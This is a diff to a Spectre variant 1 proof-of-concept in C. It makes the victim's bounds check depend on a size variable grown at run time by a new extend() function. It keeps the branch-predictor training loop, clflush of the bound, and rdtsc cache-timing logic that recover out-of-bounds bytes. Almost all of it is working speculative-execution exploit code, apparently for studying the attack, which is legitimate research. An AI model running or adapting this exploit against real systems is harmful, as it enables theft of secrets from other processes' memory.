@@ -43,7 +43,8 @@
 /********************************************************************
 Victim code.
 ********************************************************************/
-unsigned int array1_size = 16;
+#define MAX_SIZE 16
+unsigned int size_in_use = 8;
 uint8_t unused1[64];
 uint8_t array1[16] = {
   1,
@@ -94,8 +95,15 @@ static inline unsigned long array_index_mask_nospec(unsigned long index,
 }
 #endif
 
+void extend() {
+  unsigned int new_size = size_in_use * 2;
+  if (new_size <= MAX_SIZE) {
+    size_in_use = new_size;
+  }
+}
+
 void victim_function(size_t x) {
-  if (x < array1_size) {
+  if (x < size_in_use) {
 #ifdef INTEL_MITIGATION
 		/*
 		 * According to Intel et al, the best way to mitigate this is to 
@@ -169,10 +177,10 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
 #endif
 
     /* 30 loops: 5 training runs (x=training_x) per attack run (x=malicious_x) */
-    training_x = tries % array1_size;
+    training_x = tries % MAX_SIZE;
     for (j = 29; j >= 0; j--) {
 #ifndef NOCLFLUSH
-      _mm_clflush( & array1_size);
+      _mm_clflush( & size_in_use);
 #else
       /* Alternative to using clflush to flush the CPU cache */
       /* Read addresses at 4096-byte intervals out of a large array.
@@ -189,7 +197,6 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       /* Bit twiddling to set x=training_x if j%6!=0 or malicious_x if j%6==0 */
       /* Avoid jumps in case those tip off the branch predictor */
       x = ((j % 6) - 1) & ~0xFFFF; /* Set x=0xFFFFFFFFFFFF0000 if j%6==0, else x=0 */
-      printf("%lx\n", x);
       x = (x | (x >> 16)); /* Set x=-1 if j&6=0, else x=0 */
       x = training_x ^ (x & (malicious_x ^ training_x));
 
@@ -252,7 +259,7 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
       time2 = __rdtsc() - time1; /* READ TIMER & COMPUTE ELAPSED TIME */
 #endif
 #endif
-      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % array1_size])
+      if ((int)time2 <= cache_hit_threshold && mix_i != array1[tries % MAX_SIZE])
         results[mix_i]++; /* cache hit - add +1 to score for this value */
     }
 
@@ -269,11 +276,11 @@ void readMemoryByte(int cache_hit_threshold, size_t malicious_x, uint8_t value[2
     if (results[j] >= (2 * results[k] + 5) || (results[j] == 2 && results[k] == 0))
       break; /* Clear success if best is > 2*runner-up + 5 or 2/0) */
   }
-  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
   value[0] = (uint8_t) j;
   score[0] = results[j];
   value[1] = (uint8_t) k;
   score[1] = results[k];
+  results[0] ^= junk; /* use junk so code above won’t get optimized out*/
 }
 
 /*
@@ -303,6 +310,12 @@ int main(int argc,
     cache_flush_array[i] = 1;
   }
   #endif
+
+  if (argc >= 2) {
+    for (int i = 0; i < atoi(argv[1]); i++) {
+      extend();
+    }
+  }
   
   for (i = 0; i < (int)sizeof(array2); i++) {
     array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
